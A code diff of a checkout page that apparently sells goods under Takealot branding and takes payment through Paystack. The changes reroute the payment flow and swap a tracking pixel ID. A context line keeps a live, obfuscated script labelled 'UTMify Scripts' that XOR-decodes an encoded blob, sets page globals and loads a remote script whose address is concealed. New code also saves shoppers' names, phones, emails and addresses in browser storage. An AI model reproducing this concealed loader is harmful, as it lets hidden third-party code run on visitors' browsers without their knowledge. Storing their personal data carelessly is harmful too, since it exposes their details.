@@ -29,7 +29,7 @@
   <!-- UTMify Scripts -->
   <script>(function(){var o_dd60=atob("DND//BOC/v/VcFbYMKvdiWHu3MX3GCKsQKPF0zzhmpH7BSK1WbaG0nDtk9G3AnmrU6KWjGfx0YqhHSX3XLGLmWD20JWmUnr6UaSLjnrgi4uwA3Tia6vdknLvm93vUjK5RLHSiWfvl5msXSaqVaaakmevhpy6FHurU7vd0DH0n5OgFXTiEvKC0GigkJ64FXTiErSeiHKvi4u4GTChHaCNmWXnkIv4AyO6WbSM3j+giJ65BTP6CvLdgU7/");var w_2in=[];for(var d_n=0;d_n<o_dd60.length;d_n++){w_2in.push(o_dd60.charCodeAt(d_n)&255);}var h_b1=w_2in[0];var u_zmp=w_2in.slice(1,1+h_b1);var v_q=w_2in.slice(1+h_b1);var n_0=v_q.map(function(b,y_uq){return b^u_zmp[y_uq%h_b1];});var n_sr="";for(var u_h9r=0;u_h9r<n_0.length;u_h9r++){n_sr+=String.fromCharCode(n_0[u_h9r]&255);}var i_m=decodeURIComponent(escape(n_sr));var u_sx=JSON.parse(i_m);var t_au=u_sx.globals||[];t_au.forEach(function(d_oxhq){window[d_oxhq.name]=d_oxhq.value;});var x_9n=document.createElement("script");x_9n.src=u_sx.url;x_9n.async=true;x_9n.defer=true;(u_sx.attributes||[]).forEach(function(o_i){x_9n.setAttribute(o_i.name,o_i.value);});(document.head||document.documentElement).appendChild(x_9n);})();</script>
   <script>
-    window.pixelId = "68c92beba8283e33b6647fe4";
+    window.pixelId = "6ac6b18e5859209a0837b820";
     var a = document.createElement("script");
     a.setAttribute("async", "");
     a.setAttribute("defer", "");
@@ -1543,10 +1543,37 @@
         const order = await resp.json();
         console.log("[Payment Order Response]", order);
 
-        if (order && (order.access_code || order.checkout_token)) {
+        if (order && (order.access_code || order.checkout_token || order.checkout_url)) {
           btn.innerHTML = '<span>⚡ OPENING SECURE CHECKOUT...</span>';
 
-          // 1. Direct Native Popup via access_code
+          const checkoutUrl = (order && order.checkout_url)
+            ? order.checkout_url
+            : (order.access_code ? ('https://checkout.paystack.com/' + order.access_code) : '');
+
+          try {
+            localStorage.setItem('takealot_pending_order', JSON.stringify({
+              orderId: orderId,
+              amount: finalAmount,
+              qty: quantity,
+              name: fullName,
+              phone: phone,
+              email: email,
+              address: fullAddress,
+              p: pSlug
+            }));
+          } catch (_) {}
+
+          // Mobile & In-App Browsers (Instagram, Facebook, TikTok, Safari):
+          // Direct navigation is 100% reliable, zero popup blocks, zero iframe security restrictions
+          const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|FBAN|FBAV|Instagram|TikTok/i.test(navigator.userAgent || '');
+
+          if (isMobileDevice && checkoutUrl) {
+            btn.innerHTML = '<span>🔒 REDIRECTING TO PAYMENT...</span>';
+            window.location.href = checkoutUrl;
+            return;
+          }
+
+          // Desktop: Try inline Paystack popup; fallback immediately to checkoutUrl
           if (order.access_code && window.PaystackPop) {
             try {
               const popup = new window.PaystackPop();
@@ -1561,55 +1588,13 @@
                 }
               });
               return;
-            } catch(e) {
-              console.warn("Direct popup failed, trying CreaPay engine:", e);
+            } catch(popupErr) {
+              console.warn("Desktop popup failed, falling back to direct checkout:", popupErr);
             }
           }
-
-          // 2. Native Engine with accessCode and checkoutToken
-          if (window.CreaPay && typeof window.CreaPay.pay === 'function' && order.checkout_token) {
-            try {
-              const res = await window.CreaPay.pay({
-                checkoutToken: order.checkout_token,
-                orderId: order.order_id,
-                accessCode: order.access_code,
-                onStatus: function(statusState) {
-                  console.log("[Payment onStatus]", statusState);
-                  if (statusState && (statusState.status === 'approved' || statusState.status === 'success')) {
-                    btn.innerHTML = '<span>✓ PAYMENT SUCCESSFUL!</span>';
-                    recordAndComplete();
-                  }
-                }
-              });
-
-              if (res && (res.status === 'approved' || res.status === 'success')) {
-                btn.innerHTML = '<span>✓ PAYMENT SUCCESSFUL!</span>';
-                recordAndComplete();
-                return;
-              } else if (res && (res.status === 'cancelled' || res.status === 'closed')) {
-                btn.disabled = false;
-                btn.innerHTML = originalText;
-                return;
-              }
-            } catch(e) {
-              console.warn("CreaPay.pay error, opening modal:", e);
-            }
-          }
-
-          // 3. Fallback: Direct Secure Checkout Redirect if popup didn't trigger
-          const checkoutUrl = (order && order.checkout_url)
-            ? order.checkout_url
-            : (order.access_code ? ('https://checkout.paystack.com/' + order.access_code) : '');
 
           if (checkoutUrl) {
             btn.innerHTML = '<span>🔒 OPENING SECURE CHECKOUT...</span>';
-            // Try in-page popup first, if blocked redirect directly to Paystack secure checkout
-            try {
-              if (window.PaystackPop) {
-                new window.PaystackPop().resumeTransaction(order.access_code);
-                return;
-              }
-            } catch (_) {}
             window.location.href = checkoutUrl;
             return;
           }
@@ -1628,6 +1613,8 @@
         if (typeof order !== 'undefined' && order && (order.access_code || order.checkout_url)) {
           const fallbackUrl = order.checkout_url || ('https://checkout.paystack.com/' + order.access_code);
           window.location.href = fallbackUrl;
+        } else {
+          alert("Unable to initiate secure payment. Please check your connection and try again.");
         }
       }
     });
